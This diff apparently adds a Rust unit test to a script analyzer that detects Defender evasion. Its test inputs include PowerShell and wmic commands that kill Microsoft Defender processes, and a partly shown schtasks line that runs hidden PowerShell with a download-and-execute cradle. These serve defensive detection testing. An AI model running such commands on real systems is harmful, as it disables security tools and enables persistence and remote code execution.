@@ -3729,6 +3729,24 @@ schtasks /create /tn "Updater" /tr "powershell -w hidden \"IEX(New-Object Net.We
     }
 
     #[test]
+    fn powershell_positional_stop_process_alias_security_process_emits_defender_evasion_trait() {
+        let script = br#"powershell -Command "spps MsMpEng -Force; kill SecurityHealthSystray""#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        for expected in ["MsMpEng.exe", "SecurityHealthSystray.exe"] {
+            assert!(
+                report.traits.iter().any(|t| matches!(
+                    t,
+                    Trait::DefenderEvasion { action, target }
+                        if action == "powershell-stop-process" && target == expected
+                )),
+                "PowerShell positional stop-process alias missed {expected}: {:?}",
+                report.traits
+            );
+        }
+    }
+
+    #[test]
     fn wmic_security_process_delete_emits_defender_evasion_trait() {
         let script = br#"wmic process where "name='MsMpEng.exe'" delete"#;
         let report = analyze(script, &AnalyzeConfig::default());
